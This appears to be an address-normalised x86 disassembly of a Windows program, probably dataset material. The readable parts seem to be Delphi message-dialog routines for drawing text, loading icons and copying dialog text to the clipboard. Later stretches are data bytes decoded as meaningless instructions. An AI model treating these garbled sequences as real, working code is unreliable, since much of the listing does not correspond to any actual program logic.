lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
test bl bl
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ esi + 0x68 ]
call sub_424428
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_430bc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_430c18
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ r-xdata ]
cmp al [ ebp + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c1f
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ esi ] 0x43
jne r-xdata
call sub_40c138
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_430d68
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_430c2c
sub_430c2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_430d5a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call OpenClipboard
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d61
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
xor eax eax
push ebp
push sub_430d26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404178
inc eax
push eax
push 0x2002
call GlobalAlloc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_430cfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_430cea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404178
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
mov edx ebx
pop ecx
call sub_4028c8
call EmptyClipboard
mov eax [ ebp - 0x8 ]
push eax
push 0x1
call SetClipboardData
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430cf1
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
sub_430cf1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call CloseClipboard
retn
sub_430d00
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
call sub_40391c
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call CloseClipboard
retn
sub_430d68
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430f19
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0x1b
mov al 0x2d
call sub_404568
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4041c4
mov eax ebx
call sub_42135c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x1c ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40cc84
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_403f50
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] 0xb
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] 0xb
mov eax r-xdata
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] 0xb
lea edx [ ebp - 0x74 ]
mov eax [ ebx + 0x2f8 ]
call sub_448fac
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0xb
mov eax r-xdata
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
lea edx [ ebp - 0x6c ]
mov ecx 0x9
mov eax r-xdata
call sub_408f48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f20
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x14 ]
call sub_403eb8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403edc
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
push [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_421330
lea edx [ ebp - 0x14 ]
call sub_448fac
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x18 ]
mov edx 0x3
mov al 0x20
call sub_404568
push [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404238
mov edx esi
mov eax ebx
call sub_421330
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_431008
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x7 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431578
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_430b30
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov dl 0x3
mov eax [ ebp - 0xc ]
call sub_4633f8
mov eax [ ebp - 0xc ]
call sub_4636b0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x68 ]
call sub_42517c
mov eax [ ebp - 0xc ]
mov [ eax + 0x22d ] 0x1
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1dc ] edx
mov [ eax + 0x1d8 ] sub_430bc0
mov eax [ ebp - 0xc ]
call sub_4636b0
lea edx [ ebp - 0x14 ]
call sub_430964
push 0x4
mov ebx [ ebp - 0x14 ]
push ebx
push 0x8
call MulDiv
mov [ ebp - 0x18 ] eax
push 0x8
mov esi [ ebp - 0x10 ]
push esi
push 0x8
call MulDiv
mov [ ebp - 0x1c ] eax
push 0x4
push ebx
push 0xa
call MulDiv
mov [ ebp - 0x20 ] eax
push 0x8
push esi
push 0xa
call MulDiv
mov [ ebp - 0x24 ] eax
push 0x4
push ebx
push 0x32
call MulDiv
mov [ ebp - 0x28 ] eax
xor ebx ebx
mov esi rw-data
mov [ ebp - 0x4c ] rw-data
jae r-xdata
and eax 0x7f
bt [ ebp - 0x7 ] eax
inc ebx
add [ ebp - 0x4c ] 0x4
add esi 0x4
cmp bl 0xb
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
push 0x8
mov eax [ ebp - 0x10 ]
push eax
push 0xe
call MulDiv
mov [ ebp - 0x2c ] eax
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x4
call MulDiv
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466fec
sar eax 0x1
jns r-xdata
mov eax [ esi ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
push 0x0
lea eax [ ebp - 0x60 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
mov eax [ ebp - 0xc ]
call sub_44b304
or eax 0x420
push eax
lea eax [ ebp - 0x60 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov eax [ eax ]
call sub_405c78
mov eax [ ebp - 0x64 ]
call sub_404378
push eax
mov eax [ ebp - 0xc ]
call sub_4636b0
call sub_425280
push eax
call DrawTextA
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x60 ]
add eax 0x8
mov [ esi ] eax
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x60 ]
push eax
call SetRect
mov eax [ ebp - 0xc ]
call sub_44b304
or eax 0x450
push eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404178
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebp - 0xc ]
call sub_4636b0
call sub_425280
push eax
call DrawTextA
xor eax eax
mov al [ ebp - 0x5 ]
mov edi [ eax * 4 + rw-data ]
mov esi [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
test edi edi
je r-xdata
adc eax 0x0
mov [ ebp - 0x28 ] eax
xor eax eax
xor ebx ebx
mov eax [ ebp - 0x20 ]
add eax 0x20
add esi eax
cmp [ ebp - 0x34 ] 0x20
jge r-xdata
jae r-xdata
and edx 0x7f
bt [ ebp - 0x7 ] edx
mov [ ebp - 0x34 ] 0x20
inc ebx
cmp bl 0xb
jne r-xdata
inc eax
mov edx ebx
cmp dl 0xf
ja r-xdata
xor ebx ebx
test eax eax
je r-xdata
mov edx ebx
mov eax esi
call sub_42ba68
mov edx eax
mov eax [ ebp - 0x18 ]
add eax eax
add edx eax
mov eax [ ebp - 0xc ]
call sub_462a18
mov edx [ ebp - 0x34 ]
add edx [ ebp - 0x2c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
add eax eax
add edx eax
mov eax [ ebp - 0xc ]
call sub_462a48
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466fec
mov edx eax
sar edx 0x1
jns r-xdata
mov ebx [ ebp - 0x28 ]
imul ebx eax
dec eax
imul [ ebp - 0x30 ]
add ebx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax [ ebp - 0xc ]
call sub_4486f4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466fe0
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax [ ebp - 0xc ]
call sub_448718
cmp [ ebp - 0x5 ] 0x4
je r-xdata
adc eax 0x0
lea edx [ ebp - 0x6c ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4690dc
mov edx [ ebp - 0x6c ]
mov eax [ ebp - 0xc ]
call sub_448fdc
lea edx [ ebp - 0x68 ]
xor eax eax
mov al [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
call sub_405c78
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0xc ]
call sub_448fdc
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43feb0
mov edi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x2f8 ] edi
mov edx r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax edi
call sub_440388
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448fdc
lea edx [ ebp - 0x60 ]
mov eax edi
call sub_44896c
mov eax [ ebp - 0xc ]
mov dl [ eax + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub esi [ ebp - 0x58 ]
add esi [ ebp - 0x18 ]
mov [ ebp - 0x3c ] esi
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332dc
mov [ ebp - 0x44 ] eax
mov edx r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push edi
push 0x0
call LoadIconA
push eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x168 ]
call sub_4273d4
pop edx
call sub_42b37c
push 0x20
push 0x20
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x44 ]
mov edi [ eax ]
call [ edi + 0x84 ]
test edi edi
je r-xdata
mov eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x3c ]
mov eax edi
mov esi [ eax ]
call [ esi + 0x84 ]
test [ ebp - 0x7 ] 0x4
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4489b0
sub eax [ ebp - 0x3c ]
sub eax [ edi + 0x48 ]
mov [ ebp - 0x3c ] eax
test [ ebp - 0x7 ] 0x1
je r-xdata
mov [ ebp - 0x3d ] 0x2
jmp r-xdata
mov [ ebp - 0x3d ] 0x5
mov [ ebp - 0x3d ] 0x0
jmp r-xdata
test [ ebp - 0x7 ] 0x8
je r-xdata
test [ ebp - 0x7 ] 0x2
je r-xdata
mov [ ebp - 0x3e ] 0x3
jmp r-xdata
mov [ ebp - 0x3e ] 0x2
mov [ ebp - 0x3e ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4489b0
sub eax ebx
sar eax 0x1
jns r-xdata
mov [ ebp - 0x38 ] eax
xor ebx ebx
mov [ ebp - 0x4c ] rw-data
mov esi rw-data
mov [ ebp - 0x50 ] rw-data
adc eax 0x0
jae r-xdata
and eax 0x7f
bt [ ebp - 0x7 ] eax
inc ebx
add [ ebp - 0x50 ] 0x4
add esi 0x4
add [ ebp - 0x4c ] 0x4
cmp bl 0xb
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_441fe8
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x4c ]
mov edx [ eax ]
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea edx [ ebp - 0x70 ]
mov eax [ esi ]
call sub_405c78
mov edx [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
call sub_448fdc
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
mov edx [ ebp - 0x48 ]
mov [ edx + 0x214 ] eax
cmp bl [ ebp - 0x3d ]
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43157f
lea eax [ ebp - 0x70 ]
mov edx 0x4
call sub_403edc
retn
cmp bl [ ebp - 0x3e ]
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x48 ]
call sub_4420c8
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x48 ]
mov edi [ eax ]
call [ edi + 0x84 ]
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x30 ]
add [ ebp - 0x38 ] eax
cmp bl 0xa
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ eax + 0x211 ] 0x1
mov eax [ ebp - 0x48 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x124 ] edx
mov [ eax + 0x120 ] sub_430ba8
sub_4315ac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x2 ] cx
mov ecx [ ebp + 0x8 ]
push ecx
push 0xffffffff
push 0xffffffff
push 0x0
mov cx [ ebp - 0x2 ]
call sub_4315f0
pop ecx
pop ebp
retn 0x4
sub_4315cc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x2 ] cx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
mov cx [ ebp - 0x2 ]
call sub_4315f0
pop ecx
pop ebp
retn 0xc
sub_4315f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x3 ] cx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov cx [ ebp - 0x3 ]
mov dl [ ebp - 0x1 ]
call sub_431008
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43168f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4488ec
mov eax [ ebp - 0xc ]
add eax 0x23c
mov edx [ ebp + 0x8 ]
call sub_403f0c
test ebx ebx
jl r-xdata
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4486f4
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_448718
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xec ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431696
mov eax [ ebp - 0xc ]
call sub_403128
retn
test ebx ebx
jge r-xdata
mov dl 0x4
mov eax [ ebp - 0xc ]
call sub_463a58
sub_4316c8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408ec8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_431763
add [ edi ] cl
add [ eax ] al
add ah ah
mov eax 0xc09c0048
dec eax
add [ eax ] al
add [ eax ] al
add al ah
mov eax 0xc2f80048
dec eax
add [ eax ] al
add [ eax ] al
add ah bl
mov eax 0xc0600048
dec eax
add [ eax ] al
add [ eax ] al
add al bl
mov eax 0xc4240048
dec eax
add [ eax ] al
add [ eax ] al
add ah dl
mov eax 0xc3140048
dec eax
add [ eax ] al
add [ eax ] al
add al dl
mov eax 0xc2a80048
dec eax
add [ eax ] al
add [ eax ] al
add ah cl
mov eax 0xc3ac0048
dec eax
add [ eax ] al
add [ eax ] al
add al cl
mov eax 0xc1f80048
dec eax
add [ eax ] al
add [ eax ] al
add ah al
mov eax 0xc2c00048
dec eax
add [ eax ] al
add [ eax ] al
add al al
mov eax 0xc21c0048
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 - 0x3b53ffb8 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x48 ] dh
add ah ah
ror [ eax ] 0x0
add [ eax ] al
add [ eax - 0x48 ] dh
dec eax
add [ esp + eax * 8 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x48 ] ch
add [ esp + eax * 8 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] ch
dec eax
add [ eax - 0x3e ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43186e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431875
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_40496c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_431878
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c8c
call sub_4316c8
mov eax [ r-xdata ]
call sub_417d34
mov eax [ r-xdata ]
call sub_417dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
sub_4318bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x19
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x19a20043 ] dl
inc ebx
add [ eax - 0x7bffffff ] al
push edx
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
je r-xdata
lahf
inc esp
add [ eax + 0x38 ] cl
inc ebx
add [ eax ] dh
inc esp
add al cl
add [ eax + eax + 0x34 ] 0x8a
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add [ eax ] ah
mov bl 0x44
add [ eax + 0x2c004494 ] al
xchg ebp eax
inc esp
add [ eax - 0x7b ] al
inc esp
add [ edx * 4 + 0x34ec0044 ] cl
inc ebx
add [ edx ] al
add bh dl
inc edi
jmp [ ebx + esi + 0x36440043 ]
inc ebx
add al bl
mov al 0x44
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah bl
xor al [ ebx ]
push 0x4800449f
cmp [ ebx ] al
xor al 0xa0
sub_431e7c
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
add [ ecx ] bh
inc ebx
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 + 0x11880041 ] dl
inc edx
add [ eax + edx + 0x42 ] dl
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x1004338 ] dh
add bh ch
push [ eax + 0x3a ]
inc ebx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x1ecc9072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x431e8872
add [ esi + ebp * 2 + 0x50041 ] ch
or [ ebp + 0x78 ] al
je r-xdata
dec ecx
outsb
je r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
adc al 0x45
add al dh
add al [ ebp ]
sbb bl cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4320 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] ch
inc ebx
add [ eax + 0x2240043 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
push ebx
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
insb
jae r-xdata
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edx + edi - 0x1fbffbd ] al
inc esp
add al bl
inc eax
inc ebx
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x3f440044 ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax + 0x3b ] cl
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0x4004515
inc ecx
inc ebx
add [ eax - 0xc ] ch
inc esp
add [ eax - 0x9 ] bl
inc esp
add [ eax ] dh
cmp eax 0x70043
cmp esi [ eax - 0x4fef4fee ]
xor dh [ eax - 0x4fc7ffb9 ]
0x9cff
popad
insb
loopne r-xdata
inc eax
add [ eax ] al
add bh bh
cmp [ edx ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
inc eax
add [ eax - 0x2d ] dl
inc esp
test [ ebx ] dh
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax + 0x3a ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x431f9c72
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x3a ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
sub_4320d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x21
inc ebx
add [ eax ] ch
add al [ eax ]
add [ eax + 0x1f ] dl
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
adc al 0x45
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edx + edi - 0x1fbffbd ] al
inc esp
add al bl
inc eax
inc ebx
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x3f440044 ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax + 0x3b ] cl
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0x4004515
inc ecx
inc ebx
